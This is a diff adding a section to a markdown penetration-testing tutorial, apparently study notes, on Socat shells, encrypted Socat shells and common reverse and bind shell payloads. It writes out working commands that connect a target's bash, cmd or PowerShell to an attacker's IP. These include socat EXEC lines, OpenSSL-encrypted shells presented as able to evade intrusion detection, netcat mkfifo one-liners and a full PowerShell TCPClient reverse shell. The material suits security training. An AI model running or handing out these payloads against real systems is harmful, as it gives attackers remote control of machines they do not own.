@@ -232,3 +232,193 @@ Then, in the reverse/bind shell, we execute
 This changes the registered height and width of the terminal so that programs -- text editors, etc. -- open and display correctly. 
 
 ## Socat
+
+*Socat* is similar to Netcat in some ways, but fundamentally different in many others. Socat can be thought of as a connector between two points, such as:
+
+* between a listening port and a keyboard, 
+* between a listening port and a file, or
+* between two listening ports. 
+
+For **reverse shells**, the basic syntax for a listener is
+```console
+~$ socat TCP-L:<PORT> -
+```
+
+This takes two points -- a listening port and standard input -- and connect them together. The resulting shell is unstable, much like using Netcat. 
+
+On Windows, we can connect to the listener using 
+```console
+~$ socat TCP:<LOCAL_IP>:<LOCAL_PORT> EXEC:powershell.exe,pipes
+```
+
+The `pipes` option forces Powershell (or `cmd.exe`) to use UNIX style standard input and output. 
+
+For a Linux target, we execute
+```console
+~$ socat TCP:<LOCAL_IP>:<LOCAL_PORT> EXEC:"bash -li"
+```
+
+For **bind shells**, we would start a listener on a Linux target by using: 
+```console
+~$ socat TCP-L:<PORT> EXEC:"bash -li"
+```
+
+Similarly, on a Windows target:
+```console
+~$ socat TCP-L:<PORT> EXEC:powershell.exe,pipes
+```
+
+Again, the `pipes` option is used to interface between the standard input and outputs of Windows and UNIX.
+
+The attacking machine should then execute
+```console
+~$ socat TCP:<TARGET_IP>:<TARGET_PORT> -
+```
+to connect to the listener. 
+
+-----
+
+### Stablised shells
+
+As mentioned earlier, one of the more porwerful uses for Socat is that it is able to obtain a *fully stable* Linux tty reverse shell. The listener syntax in this case is
+```console
+~$ socat TCP-L:<PORT> FILE:`tty`,raw,echo=0
+```
+
+In this case, Socat is establishing a connection between a listening port and a file -- specifically the current tty is being passed in as a file, and we set `echo` to be 0. 
+
+> This is approximately equivalent to using `Ctrl + Z`, followed by `stty raw -echo; fg` with a Netcat shell.
+
+This listener must then be activated with a specific Socat command on the target. Thus, the target must have Socat installed on it. The special command is 
+```console
+~$ socat TCP:<ATTACKER_IP>:<ATTACKER_PORT> EXEC:"bash -li",pty,stderr,sigint,setsid,sane
+```
+
+This command establishes a connection between the listener on the attacking machine to an *interactive bash session* on the target. Additionally, the bash session is initialised with the arguments: 
+* `pty` -- allocates a pseudoterminal on the target; part of the stablisation process,
+* `stderr` -- makes sure that any error messages get shown in the shell,
+* `sigint` -- passes and `Ctrl + C` commands through into the subprocess, allowing us to kill processes in the shell,
+* `setsid` -- creates the process in a new session,
+* `sane` -- stablises the terminal.
+
+In practice, using Socat to instantly obtain a stable reverse shell should look like
+
+![Socat stable shell](./img/socat_stable.png "Socat stable shell")
+
+On the left is the attacking machine with the listener, while on the right is a compromised target. The target starts with a non-interactive Netcat shell, from which the special Socat command is executed. The attacker then receives a fully interactive bash shell on the socat listener. 
+
+-----
+
+If, at any point, a Socat shell is not behaving properly, we can increase the verbosity by adding `-d -d` into the command.
+
+## Socat encrypted shells
+
+Socat is also capable of creating *encrypted* shells -- both bind and reverse. Encrypted shells **cannot** be spied on unless one has the decryption key, and are often able to bypass intrusion detection systems (IDS) as a result. 
+
+We first need to generate a certificate in order to use encrypted shells. It is easy to do this on the attacking machine
+
+```console
+~$ openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
+```
+
+This command creates a 2048-bit RSA key with a matching certificate file, self-signed and valid for just under a year. When this command is executed, it will ask for information about the certificate. This can be left blank or filled randomly. 
+
+We then merge the two created files together
+```console
+~$ cat shell.key shell.crt > shell.pem
+```
+
+Then, to set up a reverse shell listener, we use
+
+```console
+~$ socat OPENSSL-LISTEN:<PORT>, cert=shell.pem, verify=0 -
+```
+
+`verify=0` tells the connection to not bother trying to validate that our certificate has been properly signed by a recognised authority. 
+
+> The certificate **must** be used on whichever device is listening.
+
+To connect to the listener, we execute the following on the target:
+
+```console
+~$ socat OPENSSL:<LOCAL_IP>:<LOCAL_PORT>, verify=0 EXEC:/bin/bash
+```
+
+The entire process will look like
+
+![Encrypted reverse shell](./img/socat_encrypted_reverse_shell.png "Encrypted reverse shell")
+
+In the image, the attacker is on the left, while the target is on the right.
+
+Similarly for a bind shell, the target starts a listener using
+
+```console
+~$ socat OPENSSL_LISTEN:<PORT>, cert.shell.pem, verify=0 EXEC:cmd.exe,pipes
+```
+
+and the attacking machine connects to the listener using
+
+```console
+~$ socat OPENSSL:<TARGET_IP>:<TARGET_PORT>, verify=0 -
+```
+
+Since the certificate has to be used with the listener, we have to copy the `.pem` file across to the target before spawning the bind shell. 
+
+This technique also works together with the special Linux tty shell discussed [previously](#stablised-shells). The listener syntax is 
+
+```console
+~$ socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 FILE=`tty`,raw,echo=0
+```
+
+and the syntax to connect to the listener is 
+
+```console
+~$ socat OPENSSL:<ATTACKER_IP>:<ATTACKER_PORT>,verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,sane
+```
+
+## Common shell payloads
+
+In some versions of Netcat, there is a `-e` option, which allows us to execute a process upon connection. For example, if we start a listener with:
+```console
+~$ nc -lvnp <PORT> -e /bin/bash
+```
+
+Then, connecting to the above listener with Netcat results in a bind shell on the target.
+
+Similarly, if we connect to a listener using
+```console
+~$ nc <ATTACKER_IP> <PORT> -e /bin/bash
+```
+would result in a reverse shell on the target.
+
+This almost always works on Windows where a static binary is required. On Linux, we may create a listener for a bind shell using
+```console
+~$ mkfifo /tmp/f; nc -lnvp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
+```
+
+> The command first creates a [*named pipe*](https://www.linuxjournal.com/article/2156) at `/tmp/f`. It then starts a Netcat listener and connects the **input** of the listener to the **output** of the named pipe. The **output** of the Netcat listener -- the commands we sent -- is then piped into `/bin/sh`. `2>&1` sends the *stderr* stream to *stdout* and then *stdout* is sent to the input of the named pipe via `>/tmp/f`.
+
+We can similarly send a Netcat reverse shell:
+
+```console
+~$ mkfifo /tmp/f; nc <ATTACKER_IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
+```
+
+-----
+
+### for Windows Powershell
+
+When targeting a modern Windows Server, we would require a Powershell reverse shell. The standard syntax is
+
+```powershell
+powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<IP>',<PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+```
+
+replacing \<IP> with the attacker's IP address and \<PORT> with the appropriate port.
+
+-----
+
+### Other payloads
+
+For other common reverse shell payloads, [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) is a repository that contains a wide variety of shell codes. 
+
